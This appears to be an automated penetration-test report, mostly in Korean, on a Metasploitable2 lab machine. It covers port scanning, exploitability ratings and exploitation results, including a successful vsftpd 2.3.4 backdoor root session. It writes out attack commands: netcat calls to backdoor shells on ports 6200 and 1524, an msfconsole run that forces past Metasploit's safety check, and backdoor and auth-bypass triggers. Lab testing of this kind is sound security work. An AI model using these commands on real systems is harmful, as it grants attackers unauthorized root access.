# Pentest Report: 20260812-042726-metasploitable2
## Summary

- 대상: 192.168.56.105
- 진행된 단계: exploitation, flag_capture, post_exploit, scanning, vuln_analysis
- 총 findings: 153


## Scanning

### 192.168.56.105
- 플랫폼 추정: `linux`

| Port | Service | Banner |
|---|---|---|
| 21 | ftp | vsftpd 2.3.4 |
| 22 | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
| 23 | telnet | Linux telnetd |
| 25 | smtp | Postfix smtpd |
| 53 | domain | ISC BIND 9.4.2 |
| 80 | http | Apache httpd 2.2.8 ((Ubuntu) DAV/2) |
| 111 | rpcbind | 2 (RPC #100000) |
| 139 | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 445 | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 512 | exec | netkit-rsh rexecd |
| 513 | login | OpenBSD or Solaris rlogind |
| 514 | shell | Netkit rshd |
| 1099 | java-rmi | GNU Classpath grmiregistry |
| 1524 | bindshell | Metasploitable root shell |
| 2049 | nfs | 2-4 (RPC #100003) |
| 2121 | ftp | ProFTPD 1.3.1 |
| 3306 | mysql | MySQL 5.0.51a-3ubuntu5 |
| 3632 | distccd | distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) |
| 5432 | postgresql | PostgreSQL DB 8.3.0 - 8.3.7 |
| 5900 | vnc | VNC (protocol 3.3) |
| 6000 | X11 | (access denied) |
| 6667 | irc | UnrealIRCd |
| 6697 | irc | UnrealIRCd |
| 8009 | ajp13 | Apache Jserv (Protocol v1.3) |
| 8180 | http | Apache Tomcat/Coyote JSP engine 1.1 |
| 8787 | drb | Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb) |
| 38820 | java-rmi | GNU Classpath grmiregistry |
| 44231 | status | 1 (RPC #100024) |
| 53157 | mountd | 1-3 (RPC #100005) |
| 53219 | nlockmgr | 1-4 (RPC #100021) |
- `ftp_enum` 결과: {'anonymous_login_ok': True, 'listing': ''}
- `smb_enum` 결과: {'error': 'Kali 세션 락을 90s 넘게 못 얻음 - 다른 프로세스가 계속 점유 중이거나 stuck'}
- `http_enum` 결과: {'error': 'Kali 세션 락을 90s 넘게 못 얻음 - 다른 프로세스가 계속 점유 중이거나 stuck'}
- `ftp_enum` 결과: {'error': 'Kali 세션 락을 90s 넘게 못 얻음 - 다른 프로세스가 계속 점유 중이거나 stuck'}
- `http_enum` 결과: {'whatweb': '', 'gobuster': 'admin                (Status: 302) [Size: 0] [--> http://192.168.56.105:8180/admin/]\nfavicon.ico          (Status: 200) [Size: 21630]\nhost-manager         (Status: 302) [Size: 0] [--> http://192.168.56.105:8180/host-manager/]\njsp-examples         (Status: 302) [Size: ...


## Vulnerability Analysis

### 192.168.56.105

- **port 21 (ftp)** - confidence 0.90, risk `high` - vsftpd 2.3.4의 백도어(CVE-2011-2523)는 소스 tarball에 삽입된 고정 트리거(USER에 ':)' 포함) 기반으로, 배너가 정확히 'vsftpd 2.3.4'이면 오프셋이나 버전 종속 페이로드 조정이 전혀 필요 없는 결정적(deterministic) 취약점이다. 17491.rb는 RHOST만 지정하면 그대로 동작하도록 설계되어 있고(포트 6200 백도어 셸로 자동 폴백), Metasploitable2 등 표준 랩 이미지에서 코드 수정 없이 검증된 사례가 매우 많다. 성공 시 인증 없이 root 권한 명령 실행이 가능해 위험도는 최고 수준이다.
- **port 6697 (irc)** - confidence 0.55, risk `high` - 16922.rb(CVE-2010-2075) 백도어는 소켓에 'AB;명령\n'만 보내면 실행되는 구조라 오프셋/버전문자열 패치가 전혀 필요 없고 RPORT를 6697로 바꾸는 것도 인자 조정일 뿐 코드수정이 아니므로, 조건만 맞으면 그대로 통한다. 다만 배너에 '3.2.8.1'이 명시되지 않았고 이 백도어는 2009.11~2010.6 사이 배포된 트로이목마 빌드에만 존재하므로 실제 해당 조건 충족 여부가 불확실하며, 6697은 통상 SSL(ircs) 포트라 평문 TCP 소켓 통신인 이 모듈이 SSL 래핑(MSF의 SSL 옵션 설정) 없이는 핸드셰이크에 실패할 가능성이 있다. 성공 시 인증 없는 임의 명령 실행(RCE)이라 위험도는 high, 성공 여부의 불확실성 때문에 confidence는 중간 수준으로 평가한다.
- **port 6667 (irc)** - confidence 0.50, risk `medium` - LLM 판정 실패(Error code: 401 - {'type': 'error', 'error': {'type': 'authentication_error', 'message': 'API key is invalid.'}, 'request_id': None}) - searchsploit 매칭만으로 산정한 폴백 값, 사람이 재확인 권장
- **port 23 (telnet)** - confidence 0.30, risk `high` - 배너가 단순히 'Linux telnetd'로만 표시되어 GNU InetUtils 2.0~2.6 버전인지, netkit-telnet인지, ENCRYPT 옵션을 지원하는 구현체인지 확인되지 않아 52524 PoC의 전제조건(정확한 InetUtils 버전 범위)이 실제로 충족되는지 검증 불가하다. 또한 이 PoC는 telnetd가 USER=-f root를 그대로 /bin/login에 전달하고, 해당 시스템의 login/PAM 설정이 '-f' 플래그를 통한 무인증 우회를 허용해야 성공하는데, 다수의 현대 배포판은 root 원격 로그인 차단(securetty, PermitRootLogin 유사 설정)이나 PAM 정책으로 이를 막아 코드 수정 없이도 버전만 맞으면 될지는 불확실하다. 다른 후보(48170 BraveStarr, 18280 encrypt_keyid)는 각각 특정 netkit-telnet 빌드나 ENCRYPT 협상 옵션 활성화가 필요해 현재 정보로는 해당 여부를 알 수 없으므로, 정확한 telnetd 구현/버전 확인과 login -f 동작 검증 전에는 자동 실행 성공을 장담할 수 없으나 성공 시 즉시 root 셸 획득이라는 치명적 영향이 있어 위험도는 높음으로 평가한다.
- **port 513 (login)** - confidence 0.05, risk `medium` - searchsploit 검색 결과가 빈 배열이라 이 rlogind 배너에 매칭되는 공개 PoC/exploit 자체가 없으므로 코드 수정 없이 바로 실행 가능한 기성 익스플로잇이 존재하지 않는다. rlogin(513)은 프로토콜 특성상 .rhosts/hosts.equiv 기반 신뢰 인증 우회나 클라이언트 포트 스푸핑 같은 설정 취약점이 있을 수 있지만 이는 자동화된 단일 익스플로잇이 아니라 수동 구성 점검이 필요한 영역이라 위험도는 medium으로 평가한다.
- **port 25 (smtp)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이라 이 배너(Postfix smtpd)에 매칭되는 공개 Exploit-DB 항목이 존재하지 않는다. 평가할 PoC 코드 자체가 없으므로 그대로 실행 가능 여부를 판단할 대상이 없고, 자동 실행 성공 가능성은 사실상 0이다.
- **port 22 (ssh)** - confidence 0.00, risk `low` - searchsploit 결과가 빈 배열([])로, OpenSSH 4.7p1 (Debian 8ubuntu1)에 매칭되는 공개 Exploit-DB 항목이 존재하지 않는다. 평가할 실제 PoC 코드가 없으므로 코드 수정 없이 자동 실행 가능한 익스플로잇은 전무하며, 이 결과만으로는 원격 취약점 존재 여부도 판단할 수 없다. 추가 공격 표면 확인이 필요하면 별도의 취약점 스캔이나 CVE 데이터베이스 조회가 선행되어야 한다.
- **port 53 (domain)** - confidence 0.00, risk `low` - searchsploit 결과가 빈 배열이므로 이 서비스/버전에 대해 참조할 수 있는 공개 PoC 코드 자체가 없다. 코드 수정 없이 그대로 실행 가능한 익스플로잇이 존재하지 않으므로 confidence는 0에 가깝게 평가했다. BIND 9.4.2는 구버전으로 알려진 취약점(DoS 등)이 있을 수 있으나, 실제 검증 가능한 PoC가 검색 결과에 없어 이 파이프라인 단계에서는 자동 실행 대상으로 분류할 수 없다.
- **port 80 (http)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이므로 이 Apache 2.2.8 (Ubuntu) DAV/2 배너에 매칭되는 공개 PoC 자체가 존재하지 않는다. 평가할 코드가 없으므로 대상 IP만 바꿔서 그대로 실행 가능한 익스플로잇은 없다고 판단하며, 자동 실행 성공 가능성은 사실상 0이다. 참고로 이 버전/DAV 조합 자체는 Metasploitable2류 랩에서 흔히 보이는 배너지만, 실제 취약점은 이 웹서버가 아니라 그 위에서 서비스되는 애플리케이션(PHP-CGI, DAV WebDAV 업로드 설정, phpMyAdmin 등)에 있는 경우가 많아 별도의 서비스/버전 탐지 및 검색이 추가로 필요하다.
- **port 139 (netbios-ssn)** - confidence 0.00, risk `low` - searchsploit 결과가 빈 배열이므로 이 배너(Samba smbd 3.X-4.X, workgroup 정보만 노출)에 매칭되는 공개 PoC가 전혀 없다. 버전 문자열이 범위(3.X-4.X)로만 잡혀 특정 CVE(예: CVE-2017-7494 등)에 대응하는 정확한 마이너 버전을 알 수 없어 기존 익스플로잇을 오프셋/버전 체크 수정 없이 그대로 돌릴 근거 자체가 없다. 실행 가능한 코드가 없으므로 자동 실행 성공 가능성은 사실상 0이며, 추가 정보(정확한 smbd 버전, 활성 공유, RPC 인터페이스) 없이는 위험도도 낮게 평가한다.
- **port 111 (rpcbind)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열([])로, rpcbind(포트 111, RPC #100000)에 대해 매칭되는 공개 Exploit-DB 항목이 전혀 없다. 참조할 PoC 코드 자체가 없으므로 코드 수정 여부를 판단할 대상이 없고, 자동 실행 가능한 기성 익스플로잇이 존재하지 않는다는 뜻이라 confidence는 0에 가깝다. 실행 가능한 공개 익스플로잇이 없는 상태이므로 이 경로로 인한 즉각적 악용 위험은 낮게 평가된다(다만 rpcbind 자체의 정보노출/DDoS 증폭 등 별도 취약점은 이 검색 결과 범위 밖이라 별도 확인이 필요하다).
- **port 445 (netbios-ssn)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열([])로 반환되어 이 배너(Samba smbd 3.X-4.X, workgroup: WORKGROUP)에 매칭되는 공개 PoC/익스플로잇 코드 자체가 존재하지 않는다. 평가할 실제 코드가 없으므로 코드 수정 없이 그대로 통할 근거가 전혀 없어 confidence는 0에 가깝다. 버전 문자열이 매우 광범위(3.X-4.X)해 특정 CVE에 대응하는 익스플로잇이 있었다면 다수 매칭됐을 것이므로, 현재로선 자동 실행 가능한 기존 공개 익스플로잇이 없다고 판단되어 즉각적인 위험도는 낮음으로 평가한다.
- **port 512 (exec)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열([])로, netkit-rsh rexecd(포트 512, exec 서비스)에 대응하는 공개 Exploit-DB 항목이 존재하지 않는다. 평가할 실제 PoC 코드 자체가 없으므로 코드 수정 없이 자동 실행 가능한 기성 익스플로잇이 없다고 판단되며, 자동화 파이프라인에서 이 서비스에 대해 실행할 수 있는 항목이 전무하다. rexecd는 인증 우회/평문 자격증명 기반 취약점 부류이지만 이는 별도의 수동 분석(가능하면 .rhosts/인증 우회 시도 등)이 필요하지 확인된 공개 PoC 기반 자동 실행 대상은 아니다.
- **port 1099 (java-rmi)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이므로 이 서비스(java-rmi, GNU Classpath grmiregistry)에 대응하는 공개 Exploit-DB 항목 자체가 존재하지 않는다. 평가할 PoC 코드가 없으므로 코드 수정 없이 즉시 통할 익스플로잇도 없고, 자동 실행 성공 가능성은 사실상 0이다. 실제 취약점 유무와 무관하게 '기존 공개 익스플로잇 재사용' 관점에서는 위험도가 낮다고 분류한다.
- **port 514 (shell)** - confidence 0.00, risk `low` - searchsploit 결과가 빈 배열이라 이 서비스(Netkit rshd, 514/tcp)에 대응하는 공개 PoC/exploit-db 항목 자체가 없으므로 코드 수정 없이 대상 IP만 넣어 돌릴 수 있는 기성 익스플로잇이 존재하지 않는다. rsh/rshd 계열의 실제 위험은 버퍼오버플로우 같은 코드 취약점이 아니라 .rhosts/hosts.equiv 기반의 신뢰 인증 우회(IP 스푸핑, 평문 인증)이며 이는 익스플로잇 스크립트가 아니라 설정/신뢰관계 조작으로 접근해야 하는 영역이라 자동 실행형 위험도는 낮다.
- **port 2049 (nfs)** - confidence 0.00, risk `low` - searchsploit 결과가 빈 배열이므로 nfs(포트 2049, RPC #100003)에 대해 코드 수정 없이 바로 실행할 수 있는 공개 Exploit-DB PoC 자체가 존재하지 않는다. 평가할 실제 코드가 없으므로 자동 실행 성공 가능성은 사실상 0이며, 이 서비스에 대한 공격은 (있다면) rpcinfo/showmount를 통한 수동 마운트 권한 점검 등 별도 수작업 절차가 필요하다.
- **port 2121 (ftp)** - confidence 0.00, risk `low` - 제공된 searchsploit 결과가 빈 배열([])로, ProFTPD 1.3.1에 대해 매칭되는 공개 PoC/익스플로잇 항목이 전혀 없다. 평가할 실제 코드가 존재하지 않으므로 코드 수정 없이 자동 실행 가능한 익스플로잇이 있다고 판단할 근거가 없다. 이 결과만으로는 confidence를 0으로 두는 것이 타당하며, 실제 취약점 여부를 판단하려면 별도의 CVE/버전別 검색이 필요하다.
- **port 3306 (mysql)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열([])로, 이 MySQL 5.0.51a-3ubuntu5 배너에 매칭되는 공개 Exploit-DB 항목이 전혀 없다. 평가할 PoC 코드 자체가 없으므로 코드수정 없이 바로 통할 가능성은 0으로 판단하며, 실행할 익스플로잇이 없어 자동화 실행에 따른 위험도 자체도 낮다.
- **port 5432 (postgresql)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열([])로, PostgreSQL 8.3.0-8.3.7 배너에 매칭되는 공개 Exploit-DB 항목이 전혀 없다. 평가할 실제 PoC 코드 자체가 존재하지 않으므로 코드 수정 없이 그대로 통할 기존 익스플로잇은 없다고 판단하며, confidence는 0으로 처리한다. 자동 실행 파이프라인에서는 이 항목을 스킵하고 필요 시 수동 취약점 조사(인증 우회, 확장 함수 통한 RCE 등)로 전환해야 한다.
- **port 5900 (vnc)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이며 해당 VNC 서비스(protocol 3.3)에 대응하는 공개 Exploit-DB 항목이 존재하지 않는다. 평가할 실제 PoC 코드가 없으므로 코드 수정 없이 그대로 통할 가능성을 판단할 근거가 전혀 없고, 자동 실행 성공 가능성도 0에 가깝다.
- **port 6000 (X11)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이므로 이 서비스에 매칭되는 공개 Exploit-DB 항목이나 PoC 코드 자체가 존재하지 않는다. 평가할 코드가 없으므로 '코드 수정 없이 그대로 통하는지' 여부를 판단할 수 없고, 자동 실행 가능한 기성 익스플로잇은 없다고 봐야 한다. 배너가 'access denied'로 X11 접근 제어(xhost)가 활성화되어 있을 가능성이 있어 무인증 접근 기반 공격 표면도 제한적이다.
- **port 3632 (distccd)** - confidence 0.00, risk `low` - 제공된 searchsploit 결과가 빈 배열이라 distccd v1(GNU 4.2.4)에 대해 참조할 수 있는 Exploit-DB PoC 코드 자체가 없다. 코드가 없으므로 오프셋/포트/버전 문자열 수정 여부를 판단할 대상이 없고, 무수정 자동 실행 성공 가능성은 평가 불가/사실상 0이다. 이 배너와 결부된 CVE-2004-2687류 취약점은 별도의 공개 PoC를 찾거나 수동 검증을 거쳐야 하며, 현재 주어진 데이터만으로는 기성 익스플로잇을 신뢰도 있게 추천할 근거가 없다.
- **port 8009 (ajp13)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이라 이 서비스 배너에 매칭되는 공개 PoC가 DB에 존재하지 않는다. 코드 수정 없이 실행할 기존 익스플로잇 자체가 없으므로 confidence는 0으로 평가한다. (참고: AJP13에는 Ghostcat(CVE-2020-1938) 같은 별도 알려진 취약점이 있으나 이는 이번 검색 결과에 포함되지 않았으므로 이 평가에는 반영하지 않았다.)
- **port 8180 (http)** - confidence 0.00, risk `low` - searchsploit 결과가 빈 배열이라 해당 배너(Tomcat/Coyote JSP engine 1.1)에 매칭되는 공개 Exploit-DB 항목이 존재하지 않는다. 평가할 PoC 코드 자체가 없으므로 코드 수정 없이 바로 통할 가능성도 판단 불가하며, 자동 실행 가능한 기성 익스플로잇이 없다는 의미로 confidence는 0에 가깝다.
- **port 44231 (status)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이므로 이 서비스/버전(status, RPC #100024)에 매칭되는 공개 PoC가 Exploit-DB에 존재하지 않는다. 코드 수정 없이 실행할 기존 익스플로잇 자체가 없으므로 confidence는 0에 가깝고, 자동 실행 가능한 공격 경로가 확인되지 않아 즉각적 위험도는 낮음으로 평가한다. 추가 위험 판단을 위해서는 rpcinfo/버전 핑거프린팅 등 별도 수동 조사가 필요하다.
- **port 38820 (java-rmi)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이라 GNU Classpath grmiregistry(java-rmi, 38820)에 대응하는 공개 Exploit-DB 항목 자체가 존재하지 않는다. 참조할 PoC 코드가 없으므로 코드 수정 없이 바로 실행 가능한지 여부를 판단할 근거가 전혀 없고, 자동 실행 성공 가능성도 0으로 평가한다. 이 경우 자동화된 기성 익스플로잇으로 인한 위험은 없으며(수동 RMI 프로토콜 분석/커스텀 익스플로잇 개발이 필요), 별도 코드 작성 없이 위험을 판단할 수 없다.
- **port 53157 (mountd)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열이며 해당 서비스/버전에 대응하는 공개 PoC가 Exploit-DB에 존재하지 않는다. 평가할 실제 코드가 없으므로 코드 수정 없이 자동 실행 가능한 익스플로잇도 없고, 이 상태에서는 별도 대응 없이 위협이 되지 않는다.
- **port 8787 (drb)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열([])로, 'drb'와 매칭되는 Exploit-DB 항목이 전혀 없어 평가할 PoC 코드 자체가 존재하지 않는다. 코드 수정 없이 바로 실행 가능한 기성 익스플로잇이 없으므로 confidence는 0으로 판단하며, 자동화 파이프라인 관점에서는 이 경로로 즉시 악용 가능한 공개 자산이 없어 risk를 low로 분류한다. 다만 이는 DRb 프로토콜 자체의 안전성을 의미하지 않으며(Ruby DRb는 별도로 Metasploit 등에 알려진 미인증 원격코드실행 이슈가 있을 수 있음), 별도 검색어(예: 'Ruby DRb', 'distributed ruby')로 재검색하거나 Metasploit 모듈 목록을 확인해 볼 필요가 있다.
- **port 53219 (nlockmgr)** - confidence 0.00, risk `low` - searchsploit 검색 결과가 빈 배열([])로, nlockmgr(RPC #100021)에 대응하는 공개 Exploit-DB 항목이 존재하지 않는다. 참조할 실제 PoC 코드 자체가 없으므로 '코드 수정 없이 그대로 통할지'를 평가할 대상이 없고, 자동 실행 가능한 기성 익스플로잇도 없다. 이 서비스에 대해서는 기존 공개 익스플로잇을 그대로 적용하는 경로가 없으며, 별도의 취약점 분석/수동 익스플로잇 개발이 필요하다.
- **port 1524 (bindshell)** - confidence 0.00, risk `high` - searchsploit 검색 결과가 빈 배열이라 그대로 실행 가능한 공개 PoC 코드 자체가 존재하지 않으므로 자동화된 코드수정-없는 실행이라는 평가 대상이 성립하지 않는다. 다만 포트 1524의 'Metasploitable root shell' 배너는 Exploit-DB 항목이 아니라 Metasploitable2에 알려진 ingreslock 백도어로, 별도 익스플로잇 코드 없이 nc <IP> 1524 접속만으로 루트 셸이 열리는 구조이므로 서비스 자체의 위험도는 매우 높다.


## Exploitation

### 192.168.56.105

- **[성공]** port 21 - vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) (방법: Metasploit(exploit/unix/ftp/vsftpd_234_backdoor))
  - 출력에 'Meterpreter session 1 opened'과 함께 활성 세션 목록에 root 권한 x86/linux meterpreter 세션이 표시되어 있어, vsftpd 2.3.4 백도어를 통한 코드 실행 및 세션 획득이 실제로 성공했음을 나타낸다.
- **[실패]** port 21 - vsftpd 2.3.4 - Backdoor Command Execution (방법: Metasploit(exploit/unix/ftp/vsftpd_234_backdoor))
  - 익스플로잇이 AutoCheck 단계에서 'Exploit aborted due to failure'로 중단되었고, 세션 목록도 'No active sessions'로 명시되어 세션/쉘 획득에 실패했다.
- **[실패]** port 6697 - UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) (방법: Metasploit(exploit/unix/irc/unreal_ircd_3281_backdoor))
  - 출력에 "Exploit completed, but no session was created"와 "No active sessions"가 명시되어 있어 세션 획득에 실패했음을 보여준다.
- **[실패]** port 6697 - UnrealIRCd 3.2.8.1 - Remote Downloader/Execute (방법: Metasploit(exploit/unix/irc/unreal_ircd_3281_backdoor))
  - 로그에 "Exploit completed, but no session was created."와 "No active sessions."가 명시되어 있어 세션 획득에 실패했음을 보여준다. 코드 실행이나 쉘 접근을 나타내는 성공 신호(session opened 등)가 전혀 없다.
- **[실패]** port 6697 - UnrealIRCd 3.x - Remote Denial of Service (방법: PoC 스크립트)
  - 출력은 Perl 스크립트의 컴파일 단계에서 발생한 구문 오류("Unknown regexp modifier", "syntax error", "aborted due to compilation errors")로, 대상에 어떠한 패킷도 전송되지 못한 채 실행이 중단되었다. DoS 효과나 대상 반응을 나타내는 신호가 전혀 없어 명백한 실패다.
- **[실패]** port 6667 - UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) (방법: Metasploit(exploit/unix/irc/unreal_ircd_3281_backdoor))
  - 출력에 "Exploit completed, but no session was created."와 "No active sessions."가 명시되어 있어 세션 획득에 실패했음을 나타내며, 성공을 나타내는 "Command shell session N opened" 등의 신호가 전혀 없다.
- **[실패]** port 6667 - UnrealIRCd 3.2.8.1 - Remote Downloader/Execute (방법: Metasploit(exploit/unix/irc/unreal_ircd_3281_backdoor))
  - 출력에 "Exploit completed, but no session was created"와 "No active sessions"가 명시되어 있어 세션 획득이나 쉘 접근에 실패했음을 나타낸다. 다른 성공 신호(예: 'Command shell session N opened')도 존재하지 않는다.
- **[실패]** port 6667 - UnrealIRCd 3.x - Remote Denial of Service (방법: PoC 스크립트)
  - 스크립트가 Perl 문법 오류(정규식 수정자 /w 인식 불가, 'use' 구문 오류)로 컴파일 단계에서 중단되어 대상에 아무 요청도 전송되지 못했다. DoS나 다른 의도된 효과가 발생했다는 신호가 전혀 없다.
- **[실패]** port 23 - GNU InetUtils 2.6 - Telnetd Remote Privilege Escalation (방법: Metasploit(exploit/linux/telnet/gnu_inetutils_auth_bypass))
  - 출력에 "Exploit completed, but no session was created"와 "No active sessions"가 명시되어 있어 세션 획득이나 코드 실행 등 의도된 효과가 전혀 달성되지 않았음을 보여준다.
- **[실패]** port 23 - netkit-telnet-0.17 telnetd (Fedora 31) - 'BraveStarr' Remote Code Execution (방법: PoC 스크립트)
  - 출력은 argparse 사용법(usage) 오류로, 스크립트 인자(method)가 잘못 지정되어 실제 실행조차 되지 않았다. 코드 실행이나 세션 획득 등 취약점이 노리는 효과는 전혀 관찰되지 않는다.
- **[실패]** port 23 - TelnetD encrypt_keyid - Function Pointer Overwrite (방법: Metasploit(exploit/freebsd/telnet/telnet_encrypt_keyid))
  - LLM 판정 실패(Expecting ',' delimiter: line 1 column 95 (char 94)) - 출력에 명시적 실패 신호(No session/Connection refused)가 있어 휴리스틱으로 실패 판정


## Post-Exploitation (권한상승)

### 192.168.56.105

- **[실패] vsftpd 2.3.4 smiley-face backdoor — 백도어 리스너가 이미 6200/TCP에서 열려 있음** (risk: `low`) - "The port used by the backdoor bind listener is already open/in-use (6200/TCP)" — 이는 vsftpd 2.3.4 백도어가 과거에 이미 트리거되어 루트 셸 리스너가 6200에 떠 있다는 강력한 신호. 익스플로잇 모듈 자체는 안전장치로 실행을 거부했지만 리스너는 살아있음
  - 시도한 명령: `echo id | nc -w5 192.168.56.105 6200`
- **[실패] 동일 vsftpd_234_backdoor 모듈을 ForceExploit true로 재시도 (msf 자체 안전검사만 우회, 백도어 자체는 이미 검증된 것)** (risk: `medium`) - "Cannot reliably check exploitability... set ForceExploit true to override check result" — 실패 원인이 취약점 부재가 아니라 msf의 사전 점검 로직(포트 중복 감지)일 뿐임
  - 시도한 명령: `msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.105; set ForceExploit true; set LHOST 192.168.56.101; run; sleep 5; sessions -i 1 -c id; exit"`


## Flag Capture

### 192.168.56.105

- flag를 찾지 못함

